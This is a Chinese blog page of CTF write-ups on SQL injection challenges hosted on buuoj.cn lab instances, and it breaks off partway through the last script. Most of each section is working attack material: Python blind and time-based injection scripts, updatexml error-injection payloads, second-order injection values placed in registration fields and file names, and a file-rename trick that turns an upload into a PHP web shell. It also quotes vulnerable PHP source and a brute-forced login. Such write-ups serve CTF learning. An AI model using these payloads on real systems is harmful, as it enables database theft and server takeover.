<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="cop&apos;s blog">
<meta property="og:type" content="website">
<meta property="og:title" content="cop&#39;s blog">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="cop&#39;s blog">
<meta property="og:description" content="cop&apos;s blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="cop&#39;s blog">
<meta name="twitter:description" content="cop&apos;s blog">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/">





  <title>cop's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">cop's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/15/今日份sql/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cop">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="cop's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/15/今日份sql/" itemprop="url">今日份sql</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-15T16:45:27+08:00">
                2020-02-15
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="Black-Watch-入群题"><a href="#Black-Watch-入群题" class="headerlink" title="Black Watch 入群题"></a>Black Watch 入群题</h2><p>盲注，过滤了空格注释符，脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">i=1</span><br><span class="line">n=2</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(10,18):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    m=64</span><br><span class="line">    j=64</span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> range(1,8):</span><br><span class="line">        <span class="keyword">if</span> q!=1:</span><br><span class="line">            j=j/2</span><br><span class="line">            <span class="keyword">if</span> n==1:</span><br><span class="line">                m=m+j</span><br><span class="line">            <span class="keyword">elif</span> n==0:</span><br><span class="line">                m=m-j</span><br><span class="line">        m=int(m)</span><br><span class="line">        <span class="comment">#payload="""1^(if((ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;),1,0))^1""".format(i,m)</span></span><br><span class="line">        <span class="comment">#admin,contents</span></span><br><span class="line">        <span class="comment">#payload="""1^if((ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='admin')),&#123;&#125;,1))&gt;&#123;&#125;),1,0)^1""".format(i,m)</span></span><br><span class="line">        <span class="comment">#id,username,password,is_enable</span></span><br><span class="line">        payload=<span class="string">""</span><span class="string">"1^if((ascii(substr((select(group_concat(username))from(admin)),&#123;&#125;,1))&gt;&#123;&#125;),1,0)^1"</span><span class="string">""</span>.format(i,m)</span><br><span class="line">        <span class="comment">#f80e656a,5676a826 073dc863,ca8490c4</span></span><br><span class="line">        url=<span class="string">"http://e9f8d063-241c-4f7c-aea6-3afac8c5a33f.node3.buuoj.cn/backend/content_detail.php?id=&#123;&#125;"</span>.format(payload)</span><br><span class="line">        time.sleep(0.15)</span><br><span class="line">        p=requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"title"</span>  <span class="keyword">in</span> p.text:</span><br><span class="line">            n=1</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            n=0</span><br><span class="line">        <span class="keyword">if</span> q==7:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"title"</span> <span class="keyword">in</span> p.text:</span><br><span class="line">                flag=flag+chr(m+1)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flag=flag+chr(m)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></p>
<h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>username 和email处存在过滤，登陆之后只有一个改密码功能，测试发现username处存在二次注入+报错注入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">"||(updatexml(1,concat(0x3a,(select(version()))),1))%23</span></span><br><span class="line"><span class="string">1"</span>||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)<span class="built_in">where</span>(table_schema=database()))),1))%23</span><br><span class="line">article,flag,users</span><br><span class="line">1<span class="string">"||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name='users'))),1))%23</span></span><br><span class="line"><span class="string">name,pwd,enail,real_flag_1s_here</span></span><br><span class="line"><span class="string">1"</span>||(updatexml(1,concat(0x3a,(select(reverse(group_concat(real_flag_1s_here)))from(users)<span class="built_in">where</span>(real_flag_1s_here)regexp(<span class="string">'^f'</span>))),1))%23</span><br></pre></td></tr></table></figure></p>
<h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p>打开给了一个login.php,扫到register.php，注册之后登陆，只显示了username，猜测注册页面的username参数存在注入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=<span class="built_in">test</span>@666.com&amp;username=0<span class="string">'%2B(select hex(hex(database())))%2B'</span>0&amp;password=<span class="built_in">test</span></span><br></pre></td></tr></table></figure></p>
<p>如果一次hex之后字符中有字母，那么只会显示第一个字母之前的数，所以要两次hex，保证纯数字，这样才能显示出来<br>注册之后登陆，username就变成了注出来的数据，经过两次hex还原<br>字符串在两次hex后很长，会以科学计数法的形式插入，所以要每次截取10个字符<br>过滤了逗号，用substr(‘test’ from 1 for 10)的形式绕过<br>因为过滤了information所以只能盲猜表名flag<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0<span class="string">'%2B(select substr(hex(hex((select * from flag))) from 1 for 10))%2B'</span>0</span><br></pre></td></tr></table></figure></p>
<p>从<a href="https://www.ckj123.com/?p=45" target="_blank" rel="noopener">这位师傅这里嫖来的脚本</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import re as r</span><br><span class="line"> </span><br><span class="line">ch = string.ascii_lowercase+string.digits+<span class="string">'-&#125;'</span>+<span class="string">'&#123;'</span></span><br><span class="line"> </span><br><span class="line">re = requests.session()</span><br><span class="line">url = <span class="string">'http://5bdb2d21-73f8-4fc9-8d35-239911ef58c3.node3.buuoj.cn/'</span></span><br><span class="line"> </span><br><span class="line">def register(email,username):</span><br><span class="line">    url1 = url+<span class="string">'register.php'</span> </span><br><span class="line">    data = dict(email = email, username = username,password = <span class="string">'adsl1234'</span>)</span><br><span class="line">    html = re.post(url1,data=data)</span><br><span class="line">    html.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    <span class="built_in">return</span> html</span><br><span class="line"> </span><br><span class="line">def login(email):</span><br><span class="line">    url2 = url+<span class="string">'login.php'</span></span><br><span class="line">    data = dict(email = email,password = <span class="string">'adsl1234'</span>)</span><br><span class="line">    html = re.post(url2, data=data)</span><br><span class="line">    html.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    <span class="built_in">return</span> html</span><br><span class="line"></span><br><span class="line">f = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(0,17):</span><br><span class="line">    payload = <span class="string">"0'^(select substr(hex(hex((select * from flag))) from &#123;&#125; for &#123;&#125;))^'0"</span>.format(int(j)*10+1,10)</span><br><span class="line">    email = <span class="string">'&#123;&#125;@qq.com'</span>.format(str(j)+<span class="string">'14'</span>)</span><br><span class="line">    html = register(email,payload)</span><br><span class="line">    <span class="comment"># print html.text</span></span><br><span class="line">    html = login(email)</span><br><span class="line">    try:</span><br><span class="line">        res = r.findall(r<span class="string">'&lt;span class="user-name"&gt;(.*?)&lt;/span&gt;'</span>,html.text,r.S)</span><br><span class="line">        flag = res[0][1:].strip()</span><br><span class="line">        <span class="built_in">print</span> flag</span><br><span class="line">        f += flag</span><br><span class="line">        <span class="built_in">print</span> f</span><br><span class="line">        <span class="built_in">print</span> f.decode(<span class="string">'hex'</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">    except:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">"problem"</span></span><br></pre></td></tr></table></figure></p>
<p>用’ or (case when 1=1 then ‘a’ else ‘b’ end)=’a  测试是存在注入的，可以基于时间也可以基于布尔<br>改变自<a href="https://www.smi1e.top/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BAwrite-up/" target="_blank" rel="noopener">smile师傅的脚本</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">i=1</span><br><span class="line">n=2</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(10,18):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    m=64</span><br><span class="line">    j=64</span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> range(1,8):</span><br><span class="line">        <span class="keyword">if</span> q!=1:</span><br><span class="line">            j=j/2</span><br><span class="line">            <span class="keyword">if</span> n==1:</span><br><span class="line">                m=m+j</span><br><span class="line">            <span class="keyword">elif</span> n==0:</span><br><span class="line">                m=m-j</span><br><span class="line">        m=int(m)</span><br><span class="line">        payload=<span class="string">"' or (case when ascii(mid((select * from flag limit 1 offset 0)from(&#123;&#125;)for(1)))&gt;&#123;&#125; then sleep(3) else 'b' end)='a"</span>.format(i,m)</span><br><span class="line">        url = <span class="string">'http://5bdb2d21-73f8-4fc9-8d35-239911ef58c3.node3.buuoj.cn/'</span></span><br><span class="line">        data=&#123;<span class="string">"email"</span>:<span class="string">"11@qq.com"</span>,</span><br><span class="line">            <span class="string">"username"</span>:payload,</span><br><span class="line">            <span class="string">"password"</span>:<span class="string">"11"</span>&#125;</span><br><span class="line">        <span class="comment">#time.sleep(0.15)</span></span><br><span class="line">        startTime=time.time()</span><br><span class="line">        p=requests.post(url,data=data,timeout=100)</span><br><span class="line">        <span class="keyword">if</span> time.time()-startTime&gt;2:</span><br><span class="line">            n=1</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            n=0</span><br><span class="line">        <span class="keyword">if</span> q==7:</span><br><span class="line">            <span class="keyword">if</span> time.time()-startTime&gt;2:</span><br><span class="line">                flag=flag+chr(m+1)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flag=flag+chr(m)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></p>
<h2 id="XDCTF-2015-filemanager"><a href="#XDCTF-2015-filemanager" class="headerlink" title="[XDCTF 2015]filemanager"></a>[XDCTF 2015]filemanager</h2><p><a href="http://www.tar.gz泄露源码，对每个参数都都有addslashes过滤" target="_blank" rel="noopener">www.tar.gz泄露源码，对每个参数都都有addslashes过滤</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">foreach (array(<span class="variable">$_GET</span>, <span class="variable">$_POST</span>, <span class="variable">$_COOKIE</span>) as <span class="variable">$global_var</span>) &#123;</span><br><span class="line">	foreach (<span class="variable">$global_var</span> as <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">		is_string(<span class="variable">$value</span>) &amp;&amp; <span class="variable">$req</span>[<span class="variable">$key</span>] = addslashes(<span class="variable">$value</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>猜测存在二次注入，在rename.php里<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$re</span> = <span class="variable">$db</span>-&gt;query(<span class="string">"update `file` set `filename`='&#123;<span class="variable">$req</span>['newname']&#125;', `oldname`='&#123;<span class="variable">$result</span>['filename']&#125;' where `fid`=&#123;<span class="variable">$result</span>['fid']&#125;"</span>);</span><br></pre></td></tr></table></figure></p>
<p>这里使用了sql查询出来的数据filename和fid，到upload.php找到有关filename的代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = basename(<span class="variable">$file</span>[<span class="string">"name"</span>]);</span><br><span class="line"><span class="variable">$path_parts</span> = pathinfo(<span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$path_parts</span>[<span class="string">'filename'</span>] = addslashes(<span class="variable">$path_parts</span>[<span class="string">'filename'</span>]);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">"insert into `file` ( `filename`, `view`, `extension`) values( '&#123;<span class="variable">$path_parts</span>['filename']&#125;', 0, '&#123;<span class="variable">$path_parts</span>['extension']&#125;')"</span>;</span><br></pre></td></tr></table></figure></p>
<p>filename是文件名，是可控的，很明显注入点在filename，因为输出了报错信息，所以报错注入比较方便<br>但是注出来的数据库数据没有flag233，看了wp才知道要修改上传文件后缀getshell<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$oldname</span> = UPLOAD_DIR . <span class="variable">$result</span>[<span class="string">"filename"</span>] . <span class="variable">$result</span>[<span class="string">"extension"</span>];</span><br><span class="line"><span class="variable">$newname</span> = UPLOAD_DIR . <span class="variable">$req</span>[<span class="string">"newname"</span>] . <span class="variable">$result</span>[<span class="string">"extension"</span>];</span><br><span class="line"><span class="keyword">if</span> (file_exists(<span class="variable">$oldname</span>)) &#123;</span><br><span class="line">			rename(<span class="variable">$oldname</span>, <span class="variable">$newname</span>);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></p>
<p>因为新文件后缀是上次sql查询出来的，所以要先把后缀置空<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">文件名</span><br><span class="line">cop<span class="string">',`extension`='</span><span class="string">'#.jpg</span></span><br><span class="line"><span class="string">rename</span></span><br><span class="line"><span class="string">oldname=cop.jpg'</span>,`extension`=<span class="string">''</span><span class="comment">#&amp;newname=cop.jpg</span></span><br></pre></td></tr></table></figure></p>
<p>现在filename=cop.jpg,文件名是cop.jpg.jpg，要再上传一个cop.jpg内容为shell<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oldname=cop.jpg&amp;newname=cop.php</span><br></pre></td></tr></table></figure></p>
<p>flag在根目录</p>
<h2 id="facebook-ctf-2019-product-manager"><a href="#facebook-ctf-2019-product-manager" class="headerlink" title="facebook ctf 2019 product manager"></a>facebook ctf 2019 product manager</h2><p><a href="https://www.freebuf.com/articles/web/124537.html" target="_blank" rel="noopener">基于约束的SQL攻击</a><br>name char(64),数据库中有一个admin用户<br>注册一个admin+64空格+1,在select * FROM users where name=’admin+64空格+1’中查询结果是空<br>但是在insert中会去掉后面多余的字符注册一个admin+59个空格的用户，这个用户等同于admin用户<br>这是因为，SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致<br>防御方法是name列加上UNIQUE约束</p>
<h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p>git恢复源码，我恢复出来的源码不全233，从<a href="http://www.ch4ser.top/2019/04/22/SQL%E9%A2%98%E5%9E%8B%E8%AE%B0%E5%BD%95/" target="_blank" rel="noopener">旺哥</a>这里复制的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'do'</span>]))&#123;</span><br><span class="line">switch (<span class="variable">$_GET</span>[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">    <span class="variable">$category</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">'category'</span>]);</span><br><span class="line">    <span class="variable">$title</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">'title'</span>]);</span><br><span class="line">    <span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">'content'</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">            set category = '<span class="variable">$category</span>',</span></span><br><span class="line"><span class="string">                title = '<span class="variable">$title</span>',</span></span><br><span class="line"><span class="string">                content = '<span class="variable">$content</span>'"</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">    <span class="built_in">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    <span class="variable">$bo_id</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">'bo_id'</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"select category from board where id='<span class="variable">$bo_id</span>'"</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$num</span> = mysql_num_rows(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>&gt;0)&#123;</span><br><span class="line">    <span class="variable">$category</span> = mysql_fetch_array(<span class="variable">$result</span>)[<span class="string">'category'</span>];</span><br><span class="line">    <span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">'content'</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '<span class="variable">$category</span>',</span></span><br><span class="line"><span class="string">                content = '<span class="variable">$content</span>',</span></span><br><span class="line"><span class="string">                bo_id = '<span class="variable">$bo_id</span>'"</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Location: ./comment.php?id=<span class="variable">$bo_id</span>"</span>);        </span><br><span class="line">    <span class="built_in">break</span>;</span><br><span class="line">default:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>很明显category存在二次注入<br>提交一个帖子之后转到登陆，已经给了账号zhangwei 秘密zhangwei***，爆破后三位是666<br>多行的sql结合php注释避免破坏结构,附旺哥的脚本，旺哥tql<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://10a319be-9667-4c10-94ca-bdc272ca247f.node3.buuoj.cn"</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ran_str():</span><br><span class="line">    string = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(6):</span><br><span class="line">        string += chr(random.randint(ord(<span class="string">'A'</span>), ord(<span class="string">'Z'</span>)))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def login():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"username"</span>: <span class="string">"zhangwei"</span>,</span><br><span class="line">        <span class="string">"password"</span>: <span class="string">"zhangwei666"</span></span><br><span class="line">    &#125;</span><br><span class="line">    s.post(url + <span class="string">"/login.php"</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def write(payload):</span><br><span class="line">    ran_string = ran_str()</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'title'</span>: ran_string,</span><br><span class="line">        <span class="string">'category'</span>: <span class="string">"',content=("</span>+payload+<span class="string">"),/*"</span>,</span><br><span class="line">        <span class="string">'content'</span>: <span class="string">'1'</span></span><br><span class="line">    